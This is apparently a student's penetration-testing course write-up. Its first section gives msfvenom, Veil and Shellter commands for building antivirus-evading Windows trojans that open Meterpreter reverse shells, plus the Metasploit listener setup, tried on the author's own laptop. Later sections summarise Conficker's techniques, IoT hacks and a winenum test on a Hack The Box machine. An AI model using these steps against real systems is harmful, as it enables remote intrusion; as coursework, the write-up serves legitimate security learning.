# h5

## 1

*Create at least two different Trojans*

A Trojan is a malicious piece of software that tries to get access to users system by disguising itself as a legitimate program.

I set out to create a Trojan that could fool both user and computer meaning it wouldn’t get caught in antivirus software or be suspicious to humans. 

### Trojan for Windows

#### MSFvenom

I started by creating a payload using msfvenom that comes pre-installed with Kali.

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=”my ip” LPORT=4444 -f exe > mprtcp_trojan.exe

Here I’m creating a meterpreter payload with reverse shell targeting Windows machines. -p stands for payload, LHOST is my ip-address, LPORT is the port this payload uses and -f is the type of file I’m creating, exe being a Windows executable which I’m naming “mprtcp_trojan.exe”.

I uploaded my creation to Google Drive and downloaded it from there to the target computer, a Windows 10 laptop that has Avira antivirus software in addition to Windows Defender.

![](images/h5/Sieppaa2.png)
![](images/h5/Sieppaa3.png)

When I tried to download the trojan, both Defender and Chrome caught it. I wanted to try if I could get the Meterpreter connection anyway and downloaded the exe despite Chromes and Defenders warnings but Avira kindly decided to get rid of it without bothering to ask me first. 

![](images/h5/Sieppaa1.png)

Well, one of my goals was to get past a antivirus software anyway so I tried again, this time using an encoder:

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=”my ip” LPORT=4444 -e x86/shikata_ga_nai -i 3  -f exe > mprtcp_enc_trojan.exe

-e stands for encoder, shikata_ga_nai is the encoder I’m using and -i is the number of times the payload is encoded.

Unfortunately encoding didn’t help. I got caught by everything again so I tried something different.


#### Veil

Veil is a payload generator for bypassing antivirus solutions.
 
After installing Veil

    sudo apt install veil

I navigated to veil/config

    cd /usr/share/veil/config

and ran setup.

    ./setup.sh
    
Veil installs all sorts of extra stuff and bunch of Windows-style pop-ups… pop up. I kept clicking “Next” and “Finish” until setup was done.

    sudo veil

opens the Veil interface.

Veil then asks which tool you want to use. Evasion was the one I was interested in. 

Next you’ll have to choose payload. There’s 41 payloads to choose from. “List” lists all the payloads. I went with nro. 29 “python/shellcode_inject/aes_encrypt.py”.

![](images/h5/veil.png)
![](images/h5/veil2.png)

Next up is payload settings. I left them as is, except I turned on pyherion encryption with “set use_pyherion Y” because it sounds like it could help with getting past all the antivirus softwares.

![](images/h5/veil3.png)
 
Following that, what you’ll use to generate shellcode. MSFvenom sounded familiar. And after that, the shellcode it self. Meterpreter/reverse_tcp is the default and that’s what I went with.

LHOST and LPORT are the same ones as with just MSFvenom. There’s an option to enter extra options. I didn’t enter any.

Then you’ll have to pick a name and finally, a method to turn the payload into executable. I chose PyInstaller.

The executable was generated into /var/lib/veil/output/compiled.
I again tried to move the trojan into the target machine using Google Drive but unfortunately, just like the previous ones, this one also got caught and removed. I read that it could be possible to fool antivirus solutions with the right combination of payload/ encryption so I kept trying different combinations but none got past the targets defences.


#### Shellter

After some research I stumbled upon Shellter a shellcode injection tool which, like Veil, is supposed to get the payload to the target machine unnoticed. 

    sudo apt install shellter

installs Shellter and

    sudo shellter

runs it.

Shellter requires an Windows executable to inject a payload into. Instead of using any existing app I decided it would be a good idea to make my own. Not having coded anything except a hello world with Python before, Python was the obvious choice of language. Without bothering to check any tutorials or anything (because how hard can it be?) I popped open Nano and got to work. After an embarrassing amount of time (who knew Python is so into indentation also, python != python3) and checking some Python tutorials my masterpiece was complete.

Behold: Noppatesti.

    #!/usr/bin/python
    # -*- coding: utf-8 -*-

    from random import randint

    min = 1

    roll_again = 'y'

    while roll_again == 'y':
        max_num = input('Enter the number of sides on a dice: ')
        max = int(max_num)
        dice = int(input('Enter the number of dice rolled: '))
        print ('Rolling...')

        for number in range(0, dice):
            number_current = randint(min, max)
            print(number_current)

        roll_again = input('Roll again? (y/n) ')


This is a dice rolling app. It asks the user to input the number of sides on a dice, number of dice rolled and prints the outcome on console.

I gave it executable permissions and tested it:

    chmod -x noppatesti.py
    python3 noppatesti.py


Because Shellter requires .exe -files and noppatesti was a .py -file I had to convert it into .exe. I decided to do use PyInstaller. Apparently the conversion should be done in Windows so I send noppatesti to a Windows machine (the same one that was my target) via Drive. Avira thought it was a virus so I had to add an exception for it. Once I got the program past Avira I ran PyInstaller.

    pyinstaller -F noppatesti.py

Noppatesti.exe could now be found in a folder called “dist” that PyInstaller created.

I confirmed that my newly created exe ran and sent it back to Kali and launched Shellter.

I chose auto as an operation mode and noppatesti.exe as the app to inject the payload into.

![](images/h5/shellter.png)

As far as I understand, “stealth mode” allows the app function normally despite the Meterpreter connection, which sounds pretty useful feature for a trojan to have so I enabled it. Meterpreter_reverse_tcp was again my payload of choice and neither LHOST or LPORT changed either. 

![](images/h5/shellter2.png)

Shellter did its thing and I now had a supposedly infected noppatesti.exe. I again use Drive to get the file to the target computer and this time none of the antiviruses complained! Unfortunately, it wouldn’t run. Neither the Meterpreter connection nor the dice rolling part worked. 

I tried to create another infected app, this time using the manual mode but that didn’t work either. After trying with all sorts of different settings manual mode had I figured that maybe the fault was in my app. 

I tried again with templates I found in

    /usr/share/metasploit-framework/data/templates

and

    /usr/share/windows-binaries

but none of the ones I tried worked so I gave up on Shellter.


#### Back to MSFvenom and Veil

Since injecting a payload into an app should decrease the probability of getting caught by antivir and I had only used Venom and Veil to create payloads instead of creating payloads and injecting said payloads into an executable I tried again.

I started with Venom.

    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=”my ip” LPORT=4444 -x /home/jii/noppatesti.exe -k -e x86/shikata_ga_nai -i 10 -f exe > dice_malware.exe

-x is the executable payload is injected into
-k is similar to “stealth mode” found in Shellter

It didn’t fool the antivirus softwares.

I still wanted to try if I could get the Meterpreter connection to form, so I made an exception to Avira and downloaded the file to the target computer. Before running the infected noppatesti.exe, now named dice_malware.exe I set up Metasploit to listen for the connection

    msfconsole
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost “IP”
        set lport 4444
        exploit
 
and ran dice_malware.exe.

The dice rolling part didn’t work but the Meterpreter connection was established. I got in.

I tried again, this time with Veil. I followed the same steps as before with Veil except this time I added

    -x=/home/jii/noppatesti.exe

and

    -k=

as extra msfvenom options.

![](images/h5/veil4.png)
![](images/h5/veil5.png)

Unfortunately the results were exactly the same as with Venom: I got caught by antivir and dice rolling didn’t work but Meterpreter connection was established.  

I kept trying with Venom and Veil using different settings and different executables but the results never changed.
       
I later stumbled upon the following:

“The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.”

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

I guess that explains it.

In conclusion: 

I got past antivir only with an executable done with Shellter but none of those did anything when ran.
Executables made with Venom or Veil couldn’t get past antivir on their own and didn’t launch properly, however Meterpreter was established. 
Executables ran properly when they weren’t infected.


***
*The rest was written after 25.9* 
***

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

https://www.veil-framework.com/veil-tutorial/

https://www.shellterproject.com/Downloads/Shellter/Readme.txt

## 2

*Read an article about Conficker. What new techniques did it introduce?*

Conficker is a family of malware, a botnet to be exact, that targets Windows systems. While Confickers earlier variants focused on infecting as many machines as possible, Conficker.C placed much more emphasis on stealth. At its height Conficker infected somewhere between 9 and 15 million machines.

Conficker.C is the fourth variant of Conficker (after Conficker.A, B and B++). Unlike the previous versions that spread mainly by exploiting MS08-067 vulnerability, Windows file sharing and autorun.ini files found on removable storage media, Conficker.C was an update installed on computers already infected by B or B++ variant.  

Conficker.C introduced a p2p content distribution system which allows Conficker infected systems to share data between each other. It can act as both client and a server and unlike p2p systems generally, is able to find peers by generating IP -addresses to probe and port numbers to listen to. This process is repeated weekly.

Conficker.C is able to execute shared content as a new thread. This makes the reinfection backdoor mechanism present in older Conficker variants obsolete.

Conficker.C has a callhome mechanism that allows it to update itself. It creates 50000 potential call-home domains and randomly picks 500 to contact to check if updates are available. This means it doesn’t have to have fixed IP-addresses or domain names in order to contact the command and control server.  The process is repeated daily so Conficker.C only makes 500 DNS queries per day as opposed to the 3000 of the earlier versions making the C variant that much harder to detect.

Conficker is extremely resilient. It tries to prevent removal by:

locking its .dll file so other apps can not read or write to it until the lock is broken
modifying access control list to prevent opening or deleting the registry key used to load Conficker.C module
disables bunch of Windows services including Windows Defender and auto updates. It also prevents booting Windows in safe mode
blocking websites that are on its blacklist
terminating processes that are on its blacklist   

It is obfuscated by, for example, having the .dll file encrypted and decrypting itself on process startup. The decryption is polymorphic in nature and written in such way that it’s hard to analyze the code (spaghetti code, redundant api calls). Decrypted code is also obfuscated by the same spaghetti code technique but doesn’t have the redundant api calls.

Conficker is also made more resilient by its abilities of detecting if it runs on a virtual machine and patching the MS08-067 vulnerability so that other malware can’t exploit it.   

https://www.sophos.com/en-us/medialibrary/pdfs/marketing%20material/confickeranalysis.pdf

http://malware.wikia.com/wiki/Conficker


## 3

*Search Krebs and Schneiers blogs for ideas for penetration testing.*

In this blog post Bruce Schneier talks about researchers managing to get access to a gene sequencer by encoding malicious code into a DNA strand. The sequencer stores the DNA data as binary and allows it to be executed. This is how the research team managed to gain control of the sequencer machine.

Even though the vulnerability exploited was introduced into the sequencer by the researchers themselves, it is still slightly alarming that gaining control over the machine via DNA strand is even a possibility and makes you question whether using general purpose machines in these kinds of very specialized tasks is really necessary and worth the risk.


While a DNA sequencer getting hacked doesn’t really affect many of us in our day to day lives, smart TVs getting hacked via the broadcast signal might.

An Ars Technica article (linked by Schneier) explains how it is possible to embed malicious code into a TV signal. Using a proper transmitter one can send the code into any nearby TV gaining root access. The attacker can then, for example use the television to attack other devices on the home network or spy on users with the TVs camera and microphone. It is speculated that a compromised TV station could possibly send malicious code into millions of TVs.

I’m not sure I’ve realized before how vulnerable IoT devices can be. If a device is capable of receiving data and executing code It’s is likely that it can also be hijacked. There should be much greater emphasis on security when it comes to IoT but right now, using those devices as the point of attack is relatively likely to yield results.   


https://www.schneier.com/blog/archives/2017/08/hacking_a_gene_.html

https://www.schneier.com/blog/archives/2017/04/smart_tv_hack_v.html

https://arstechnica.com/information-technology/2017/03/smart-tv-hack-embeds-attack-code-into-broadcast-signal-no-access-required/

## 4

*Study and test a new pentest technique found on Safarionline*

I skimmed through “Metasploit Penetration Testing Cookbook - Third Edition” by Monika Agarwal, Abhinav Singh and Daniel Teixeira. The part “Scraping the system using winenum” caught my attention as it promised that “Windows Local Enumeration (WinEnum) script retrieves all kinds of information about the system including environment variables, network interfaces, routing, user accounts, and much more”.

I tested it by getting Meterpreter connection to Hack the box’s “Jerry”. After the connection was established I ran winenum:

run wineum

The report can be found at /root/.msf4/logs/scripts/winenum/JERRY_20180929.4140/JERRY_20180929.4140.txt.
I opened the txt file…

![](images/h5/h5jerry.png)

Thanks winenum!

I guess something went wrong or maybe Jerry just doesn’t want to give out any more info. I’ll have to investigate a bit more a bit later.

https://www.safaribooksonline.com/library/view/metasploit-penetration-testing/9781788623179/

***
Course page: http://terokarvinen.com/2018/penetration-testing-course-autumn-2018

https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

https://www.veil-framework.com/veil-tutorial/

https://www.shellterproject.com/Downloads/Shellter/Readme.txt

https://www.sophos.com/en-us/medialibrary/pdfs/marketing%20material/confickeranalysis.pdf

http://malware.wikia.com/wiki/Conficker

https://www.schneier.com/blog/archives/2017/08/hacking_a_gene_.html

https://www.schneier.com/blog/archives/2017/04/smart_tv_hack_v.html

https://arstechnica.com/information-technology/2017/03/smart-tv-hack-embeds-attack-code-into-broadcast-signal-no-access-required/

https://www.safaribooksonline.com/library/view/metasploit-penetration-testing/9781788623179/


- Lenovo Ideapad 720s
- Kali Xfce 64 live usb
- Intel Core i7-8550U
- GeForce MX150
- 8 GB RAM
- 500 GB SSD

